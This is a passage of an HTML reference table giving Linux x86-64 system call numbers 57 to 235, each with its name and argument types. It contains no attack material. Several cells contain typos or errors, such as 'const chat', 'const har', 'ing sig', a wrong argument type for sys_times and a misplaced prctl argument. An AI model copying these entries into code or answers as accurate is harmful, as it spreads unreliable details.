<td>void *parent_tid</td>
<td>void *child_tid</td>
<td></td>
<td></td>
</tr>
<tr>
<td>57</td>
<td>sys_fork</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>58</td>
<td>sys_vfork</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>59</td>
<td>sys_execve</td>
<td>const char *filename</td>
<td>const char *const argv[]</td>
<td>const char *const envp[]</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>60</td>
<td>sys_exit</td>
<td>int error_code</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>61</td>
<td>sys_wait4</td>
<td>pid_t upid</td>
<td>int *stat_addr</td>
<td>int options</td>
<td>struct rusage *ru</td>
<td></td>
<td></td>
</tr>
<tr>
<td>62</td>
<td>sys_kill</td>
<td>pid_t pid</td>
<td>int sig</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>63</td>
<td>sys_uname</td>
<td>struct old_utsname *name</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>64</td>
<td>sys_semget</td>
<td>key_t key</td>
<td>int nsems</td>
<td>int semflg</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>65</td>
<td>sys_semop</td>
<td>int semid</td>
<td>struct sembuf *tsops</td>
<td>unsigned nsops</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>66</td>
<td>sys_semctl</td>
<td>int semid</td>
<td>int semnum</td>
<td>int cmd</td>
<td>union semun arg</td>
<td></td>
<td></td>
</tr>
<tr>
<td>67</td>
<td>sys_shmdt</td>
<td>char *shmaddr</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>68</td>
<td>sys_msgget</td>
<td>key_t key</td>
<td>int msgflg</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>69</td>
<td>sys_msgsnd</td>
<td>int msqid</td>
<td>struct msgbuf *msgp</td>
<td>size_t msgsz</td>
<td>int msgflg</td>
<td></td>
<td></td>
</tr>
<tr>
<td>70</td>
<td>sys_msgrcv</td>
<td>int msqid</td>
<td>struct msgbuf *msgp</td>
<td>size_t msgsz</td>
<td>long msgtyp</td>
<td>int msgflg</td>
<td></td>
</tr>
<tr>
<td>71</td>
<td>sys_msgctl</td>
<td>int msqid</td>
<td>int cmd</td>
<td>struct msqid_ds *buf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>72</td>
<td>sys_fcntl</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>unsigned long arg</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>73</td>
<td>sys_flock</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>74</td>
<td>sys_fsync</td>
<td>unsigned int fd</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>75</td>
<td>sys_fdatasync</td>
<td>unsigned int fd</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>76</td>
<td>sys_truncate</td>
<td>const char *path</td>
<td>long length</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>77</td>
<td>sys_ftruncate</td>
<td>unsigned int fd</td>
<td>unsigned long length</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>78</td>
<td>sys_getdents</td>
<td>unsigned int fd</td>
<td>struct linux_dirent *dirent</td>
<td>unsigned int count</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>79</td>
<td>sys_getcwd</td>
<td>char *buf</td>
<td>unsigned long size</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>80</td>
<td>sys_chdir</td>
<td>const char *filename</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>81</td>
<td>sys_fchdir</td>
<td>unsigned int fd</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>82</td>
<td>sys_rename</td>
<td>const char *oldname</td>
<td>const char *newname</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>83</td>
<td>sys_mkdir</td>
<td>const char *pathname</td>
<td>int mode</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>84</td>
<td>sys_rmdir</td>
<td>const char *pathname</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>85</td>
<td>sys_creat</td>
<td>const char *pathname</td>
<td>int mode</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>86</td>
<td>sys_link</td>
<td>const char *oldname</td>
<td>const char *newname</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>87</td>
<td>sys_unlink</td>
<td>const char *pathname</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>88</td>
<td>sys_symlink</td>
<td>const char *oldname</td>
<td>const char *newname</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>89</td>
<td>sys_readlink</td>
<td>const char *path</td>
<td>char *buf</td>
<td>int bufsiz</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>90</td>
<td>sys_chmod</td>
<td>const char *filename</td>
<td>mode_t mode</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>91</td>
<td>sys_fchmod</td>
<td>unsigned int fd</td>
<td>mode_t mode</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>92</td>
<td>sys_chown</td>
<td>const char *filename</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>93</td>
<td>sys_fchown</td>
<td>unsigned int fd</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>94</td>
<td>sys_lchown</td>
<td>const char *filename</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>95</td>
<td>sys_umask</td>
<td>int mask</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>96</td>
<td>sys_gettimeofday</td>
<td>struct timeval *tv</td>
<td>struct timezone *tz</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>97</td>
<td>sys_getrlimit</td>
<td>unsigned int resource</td>
<td>struct rlimit *rlim</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>98</td>
<td>sys_getrusage</td>
<td>int who</td>
<td>struct rusage *ru</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>99</td>
<td>sys_sysinfo</td>
<td>struct sysinfo *info</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>100</td>
<td>sys_times</td>
<td>struct sysinfo *info</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>101</td>
<td>sys_ptrace</td>
<td>long request</td>
<td>long pid</td>
<td>unsigned long addr</td>
<td>unsigned long data</td>
<td></td>
<td></td>
</tr>
<tr>
<td>102</td>
<td>sys_getuid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>103</td>
<td>sys_syslog</td>
<td>int type</td>
<td>char *buf</td>
<td>int len</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>104</td>
<td>sys_getgid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>105</td>
<td>sys_setuid</td>
<td>uid_t uid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>106</td>
<td>sys_setgid</td>
<td>gid_t gid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>107</td>
<td>sys_geteuid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>108</td>
<td>sys_getegid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>109</td>
<td>sys_setpgid</td>
<td>pid_t pid</td>
<td>pid_t pgid</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>110</td>
<td>sys_getppid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>111</td>
<td>sys_getpgrp</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>112</td>
<td>sys_setsid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>113</td>
<td>sys_setreuid</td>
<td>uid_t ruid</td>
<td>uid_t euid</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>114</td>
<td>sys_setregid</td>
<td>gid_t rgid</td>
<td>gid_t egid</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>115</td>
<td>sys_getgroups</td>
<td>int gidsetsize</td>
<td>gid_t *grouplist</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>116</td>
<td>sys_setgroups</td>
<td>int gidsetsize</td>
<td>gid_t *grouplist</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>117</td>
<td>sys_setresuid</td>
<td>uid_t *ruid</td>
<td>uid_t *euid</td>
<td>uid_t *suid</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>118</td>
<td>sys_getresuid</td>
<td>uid_t *ruid</td>
<td>uid_t *euid</td>
<td>uid_t *suid</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>119</td>
<td>sys_setresgid</td>
<td>gid_t rgid</td>
<td>gid_t egid</td>
<td>gid_t sgid</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>120</td>
<td>sys_getresgid</td>
<td>gid_t *rgid</td>
<td>gid_t *egid</td>
<td>gid_t *sgid</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>121</td>
<td>sys_getpgid</td>
<td>pid_t pid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>122</td>
<td>sys_setfsuid</td>
<td>uid_t uid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>123</td>
<td>sys_setfsgid</td>
<td>gid_t gid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>124</td>
<td>sys_getsid</td>
<td>pid_t pid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>125</td>
<td>sys_capget</td>
<td>cap_user_header_t header</td>
<td>cap_user_data_t dataptr</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>126</td>
<td>sys_capset</td>
<td>cap_user_header_t header</td>
<td>const cap_user_data_t data</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>127</td>
<td>sys_rt_sigpending</td>
<td>sigset_t *set</td>
<td>size_t sigsetsize</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>128</td>
<td>sys_rt_sigtimedwait</td>
<td>const sigset_t *uthese</td>
<td>siginfo_t *uinfo</td>
<td>const struct timespec *uts</td>
<td>size_t sigsetsize</td>
<td></td>
<td></td>
</tr>
<tr>
<td>129</td>
<td>sys_rt_sigqueueinfo</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>siginfo_t *uinfo</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>130</td>
<td>sys_rt_sigsuspend</td>
<td>sigset_t *unewset</td>
<td>size_t sigsetsize</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>131</td>
<td>sys_sigaltstack</td>
<td>const stack_t *uss</td>
<td>stack_t *uoss</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>132</td>
<td>sys_utime</td>
<td>char *filename</td>
<td>struct utimbuf *times</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>133</td>
<td>sys_mknod</td>
<td>const char *filename</td>
<td>umode_t mode</td>
<td>unsigned dev</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>134</td>
<td>sys_uselib</td>
<td>NOT IMPLEMENTED</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>135</td>
<td>sys_personality</td>
<td>unsigned int personality</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>136</td>
<td>sys_ustat</td>
<td>unsigned dev</td>
<td>struct ustat *ubuf</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>137</td>
<td>sys_statfs</td>
<td>const char *pathname</td>
<td>struct statfs *buf</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>138</td>
<td>sys_fstatfs</td>
<td>unsigned int fd</td>
<td>struct statfs *buf</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>139</td>
<td>sys_sysfs</td>
<td>int option</td>
<td>unsigned long arg1</td>
<td>unsigned long arg2</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>140</td>
<td>sys_getpriority</td>
<td>int which</td>
<td>int who</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>141</td>
<td>sys_setpriority</td>
<td>int which</td>
<td>int who</td>
<td>int niceval</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>142</td>
<td>sys_sched_setparam</td>
<td>pid_t pid</td>
<td>struct sched_param *param</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>143</td>
<td>sys_sched_getparam</td>
<td>pid_t pid</td>
<td>struct sched_param *param</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>144</td>
<td>sys_sched_setscheduler</td>
<td>pid_t pid</td>
<td>int policy</td>
<td>struct sched_param *param</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>145</td>
<td>sys_sched_getscheduler</td>
<td>pid_t pid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>146</td>
<td>sys_sched_get_priority_max</td>
<td>int policy</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>147</td>
<td>sys_sched_get_priority_min</td>
<td>int policy</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>148</td>
<td>sys_sched_rr_get_interval</td>
<td>pid_t pid</td>
<td>struct timespec *interval</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>149</td>
<td>sys_mlock</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>150</td>
<td>sys_munlock</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>151</td>
<td>sys_mlockall</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>152</td>
<td>sys_munlockall</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>153</td>
<td>sys_vhangup</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>154</td>
<td>sys_modify_ldt</td>
<td>int func</td>
<td>void *ptr</td>
<td>unsigned long bytecount</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>155</td>
<td>sys_pivot_root</td>
<td>const char *new_root</td>
<td>const char *put_old</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>156</td>
<td>sys__sysctl</td>
<td>struct __sysctl_args *args</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>157</td>
<td>sys_prctl</td>
<td>int option</td>
<td>unsigned long arg2</td>
<td>unsigned long arg3</td>
<td>unsigned long arg4</td>
<td></td>
<td>unsigned long arg5</td>
</tr>
<tr>
<td>158</td>
<td>sys_arch_prctl</td>
<td>struct task_struct *task</td>
<td>int code</td>
<td>unsigned long *addr</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>159</td>
<td>sys_adjtimex</td>
<td>struct timex *txc_p</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>160</td>
<td>sys_setrlimit</td>
<td>unsigned int resource</td>
<td>struct rlimit *rlim</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>161</td>
<td>sys_chroot</td>
<td>const char *filename</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>162</td>
<td>sys_sync</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>163</td>
<td>sys_acct</td>
<td>const char *name</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>164</td>
<td>sys_settimeofday</td>
<td>struct timeval *tv</td>
<td>struct timezone *tz</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>165</td>
<td>sys_mount</td>
<td>char *dev_name</td>
<td>char *dir_name</td>
<td>char *type</td>
<td>unsigned long flags</td>
<td>void *data</td>
<td></td>
</tr>
<tr>
<td>166</td>
<td>sys_umount2</td>
<td>const char *target</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>167</td>
<td>sys_swapon</td>
<td>const char *specialfile</td>
<td>int swap_flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>168</td>
<td>sys_swapoff</td>
<td>const char *specialfile</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>169</td>
<td>sys_reboot</td>
<td>int magic1</td>
<td>int magic2</td>
<td>unsigned int cmd</td>
<td>void *arg</td>
<td></td>
<td></td>
</tr>
<tr>
<td>170</td>
<td>sys_sethostname</td>
<td>char *name</td>
<td>int len</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>171</td>
<td>sys_setdomainname</td>
<td>char *name</td>
<td>int len</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>172</td>
<td>sys_iopl</td>
<td>unsigned int level</td>
<td>struct pt_regs *regs</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>173</td>
<td>sys_ioperm</td>
<td>unsigned long from</td>
<td>unsigned long num</td>
<td>int turn_on</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>174</td>
<td>sys_create_module</td>
<td>REMOVED IN Linux 2.6</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>175</td>
<td>sys_init_module</td>
<td>void *umod</td>
<td>unsigned long len</td>
<td>const char *uargs</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>176</td>
<td>sys_delete_module</td>
<td>const chat *name_user</td>
<td>unsigned int flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>177</td>
<td>sys_get_kernel_syms</td>
<td>REMOVED IN Linux 2.6</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>178</td>
<td>sys_query_module</td>
<td>REMOVED IN Linux 2.6</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>179</td>
<td>sys_quotactl</td>
<td>unsigned int cmd</td>
<td>const char *special</td>
<td>qid_t id</td>
<td>void *addr</td>
<td></td>
<td></td>
</tr>
<tr>
<td>180</td>
<td>sys_nfsservctl</td>
<td>NOT IMPLEMENTED</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>181</td>
<td>sys_getpmsg</td>
<td>NOT IMPLEMENTED</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>182</td>
<td>sys_putpmsg</td>
<td>NOT IMPLEMENTED</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>183</td>
<td>sys_afs_syscall</td>
<td>NOT IMPLEMENTED</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>184</td>
<td>sys_tuxcall</td>
<td>NOT IMPLEMENTED</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>185</td>
<td>sys_security</td>
<td>NOT IMPLEMENTED</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>186</td>
<td>sys_gettid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>187</td>
<td>sys_readahead</td>
<td>int fd</td>
<td>loff_t offset</td>
<td>size_t count</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>188</td>
<td>sys_setxattr</td>
<td>const char *pathname</td>
<td>const char *name</td>
<td>const void *value</td>
<td>size_t size</td>
<td>int flags</td>
<td></td>
</tr>
<tr>
<td>189</td>
<td>sys_lsetxattr</td>
<td>const char *pathname</td>
<td>const char *name</td>
<td>const void *value</td>
<td>size_t size</td>
<td>int flags</td>
<td></td>
</tr>
<tr>
<td>190</td>
<td>sys_fsetxattr</td>
<td>int fd</td>
<td>const char *name</td>
<td>const void *value</td>
<td>size_t size</td>
<td>int flags</td>
<td></td>
</tr>
<tr>
<td>191</td>
<td>sys_getxattr</td>
<td>const char *pathname</td>
<td>const char *name</td>
<td>void *value</td>
<td>size_t size</td>
<td></td>
<td></td>
</tr>
<tr>
<td>192</td>
<td>sys_lgetxattr</td>
<td>const char *pathname</td>
<td>const char *name</td>
<td>void *value</td>
<td>size_t size</td>
<td></td>
<td></td>
</tr>
<tr>
<td>193</td>
<td>sys_fgetxattr</td>
<td>int fd</td>
<td>const har *name</td>
<td>void *value</td>
<td>size_t size</td>
<td></td>
<td></td>
</tr>
<tr>
<td>194</td>
<td>sys_listxattr</td>
<td>const char *pathname</td>
<td>char *list</td>
<td>size_t size</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>195</td>
<td>sys_llistxattr</td>
<td>const char *pathname</td>
<td>char *list</td>
<td>size_t size</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>196</td>
<td>sys_flistxattr</td>
<td>int fd</td>
<td>char *list</td>
<td>size_t size</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>197</td>
<td>sys_removexattr</td>
<td>const char *pathname</td>
<td>const char *name</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>198</td>
<td>sys_lremovexattr</td>
<td>const char *pathname</td>
<td>const char *name</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>199</td>
<td>sys_fremovexattr</td>
<td>int fd</td>
<td>const char *name</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>200</td>
<td>sys_tkill</td>
<td>pid_t pid</td>
<td>ing sig</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>201</td>
<td>sys_time</td>
<td>time_t *tloc</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>202</td>
<td>sys_futex</td>
<td>u32 *uaddr</td>
<td>int op</td>
<td>u32 val</td>
<td>struct timespec *utime</td>
<td>u32 *uaddr2</td>
<td>u32 val3</td>
</tr>
<tr>
<td>203</td>
<td>sys_sched_setaffinity</td>
<td>pid_t pid</td>
<td>unsigned int len</td>
<td>unsigned long *user_mask_ptr</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>204</td>
<td>sys_sched_getaffinity</td>
<td>pid_t pid</td>
<td>unsigned int len</td>
<td>unsigned long *user_mask_ptr</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>205</td>
<td>sys_set_thread_area</td>
<td>NOT IMPLEMENTED. Use arch_prctl</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>206</td>
<td>sys_io_setup</td>
<td>unsigned nr_events</td>
<td>aio_context_t *ctxp</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>207</td>
<td>sys_io_destroy</td>
<td>aio_context_t ctx</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>208</td>
<td>sys_io_getevents</td>
<td>aio_context_t ctx_id</td>
<td>long min_nr</td>
<td>long nr</td>
<td>struct io_event *events</td>
<td></td>
<td></td>
</tr>
<tr>
<td>209</td>
<td>sys_io_submit</td>
<td>aio_context_t ctx_id</td>
<td>long nr</td>
<td>struct iocb **iocbpp</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>210</td>
<td>sys_io_cancel</td>
<td>aio_context_t ctx_id</td>
<td>struct iocb *iocb</td>
<td>struct io_event *result</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>211</td>
<td>sys_get_thread_area</td>
<td>NOT IMPLEMENTED. Use arch_prctl</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>212</td>
<td>sys_lookup_dcookie</td>
<td>u64 cookie64</td>
<td>long buf</td>
<td>long len</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>213</td>
<td>sys_epoll_create</td>
<td>int size</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>214</td>
<td>sys_epoll_ctl_old</td>
<td>NOT IMPLEMENTED</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>215</td>
<td>sys_epoll_wait_old</td>
<td>NOT IMPLEMENTED</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>216</td>
<td>sys_remap_file_pages</td>
<td>unsigned long start</td>
<td>unsigned long size</td>
<td>unsigned long prot</td>
<td>unsigned long pgoff</td>
<td>unsigned long flags</td>
<td></td>
</tr>
<tr>
<td>217</td>
<td>sys_getdents64</td>
<td>unsigned int fd</td>
<td>struct linux_dirent64 *dirent</td>
<td>unsigned int count</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>218</td>
<td>sys_set_tid_address</td>
<td>int *tidptr</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>219</td>
<td>sys_restart_syscall</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>220</td>
<td>sys_semtimedop</td>
<td>int semid</td>
<td>struct sembuf *tsops</td>
<td>unsigned nsops</td>
<td>const struct timespec *timeout</td>
<td></td>
<td></td>
</tr>
<tr>
<td>221</td>
<td>sys_fadvise64</td>
<td>int fd</td>
<td>loff_t offset</td>
<td>size_t len</td>
<td>int advice</td>
<td></td>
<td></td>
</tr>
<tr>
<td>222</td>
<td>sys_timer_create</td>
<td>const clockid_t which_clock</td>
<td>struct sigevent *timer_event_spec</td>
<td>timer_t *created_timer_id</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>223</td>
<td>sys_timer_settime</td>
<td>timer_t timer_id</td>
<td>int flags</td>
<td>const struct itimerspec *new_setting</td>
<td>struct itimerspec *old_setting</td>
<td></td>
<td></td>
</tr>
<tr>
<td>224</td>
<td>sys_timer_gettime</td>
<td>timer_t timer_id</td>
<td>struct itimerspec *setting</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>225</td>
<td>sys_timer_getoverrun</td>
<td>timer_t timer_id</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>226</td>
<td>sys_timer_delete</td>
<td>timer_t timer_id</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>227</td>
<td>sys_clock_settime</td>
<td>const clockid_t which_clock</td>
<td>const struct timespec *tp</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>228</td>
<td>sys_clock_gettime</td>
<td>const clockid_t which_clock</td>
<td>struct timespec *tp</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>229</td>
<td>sys_clock_getres</td>
<td>const clockid_t which_clock</td>
<td>struct timespec *tp</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>230</td>
<td>sys_clock_nanosleep</td>
<td>const clockid_t which_clock</td>
<td>int flags</td>
<td>const struct timespec *rqtp</td>
<td>struct timespec *rmtp</td>
<td></td>
<td></td>
</tr>
<tr>
<td>231</td>
<td>sys_exit_group</td>
<td>int error_code</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>232</td>
<td>sys_epoll_wait</td>
<td>int epfd</td>
<td>struct epoll_event *events</td>
<td>int maxevents</td>
<td>int timeout</td>
<td></td>
<td></td>
</tr>
<tr>
<td>233</td>
<td>sys_epoll_ctl</td>
<td>int epfd</td>
<td>int op</td>
<td>int fd</td>
<td>struct epoll_event *event</td>
<td></td>
<td></td>
</tr>
<tr>
<td>234</td>
<td>sys_tgkill</td>
<td>pid_t tgid</td>
<td>pid_t pid</td>
<td>int sig</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>235</td>
<td>sys_utimes</td>
